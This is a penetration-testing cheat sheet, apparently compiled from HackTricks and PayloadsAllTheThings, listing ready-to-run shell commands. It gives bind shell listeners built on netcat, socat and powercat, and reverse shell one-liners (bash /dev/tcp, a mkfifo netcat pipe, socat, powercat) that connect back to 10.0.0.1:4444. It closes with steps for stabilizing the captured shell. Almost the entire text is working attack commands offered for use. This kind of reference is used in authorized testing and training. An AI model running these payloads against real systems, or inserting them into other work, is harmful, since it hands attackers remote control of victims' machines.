# Bind and Reverse shell

## References

- https://book.hacktricks.xyz/shells/shells/linux
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Bind shell
```sh
# NCAT
$ nc -l 4444 -e /bin/bash

# Socat (linux)
$ socat tcp4-listen:4444,fork exec:/bin/bash

# Socat secure (linux)
$ socat openssl-listen:4444,cert=bind_shell.pem,verify=0,fork exec:/bin/bash

# Socat (Winodws)
$ socat tcp4-listen:4444,fork exec:/bin/bash,pipes

# Socat secure (Winodws)
$ socat openssl-listen:4444,cert=bind_shell.pem,verify=0,fork exec:/bin/bash,pipes

# Powercat (Winodws)
$ powercat -l -p 4444
```

## Reverse shell
```sh
# Bash
$ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 >/tmp/f

# NCAT
$ nc 10.0.0.1 4444 -e /bin/bash

# Socat (linux)
$ socat tcp:10.0.0.1:4444,pty,stderr,setsid,sigint,sane exec:/bin/bash

# Socat secure (linux)
$ socat openssl:10.0.0.1:4444,pty,stderr,setsid,sigint,sane,verify=0 exec:/bin/bash

# Socat (windows)
$ socat tcp:10.0.0.1:4444,pty,stderr,setsid,sigint,sane exec:cmd,pipes

# Socat secure (windows)
$ socat openssl:10.0.0.1:4444,pty,stderr,setsid,sigint,sane,verify=0 exec:cmd,pipes

# Powercat (Winodws)
$ powercat -c 10.0.0.1 -p 4444 -e cmd
```

## Stabilizing shell
```sh
# Must be in BASH before listener is set up
$ bash

# One of the following
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ ruby -e "exec '/bin/bash'"
$ perl -e "exec '/bin/bash';"

# Then suspend listener
$ ^Z

# Turn on echo special character and bring back listener
$ stty raw -echo && fg %1

# Your shell is now buggy, enter
$ export TERM=xterm-256color

# Then ajust size (can find your terminal size with `stty -a`)
$ stty rows 53 columns 237

# Reset and enjor
$ reset
```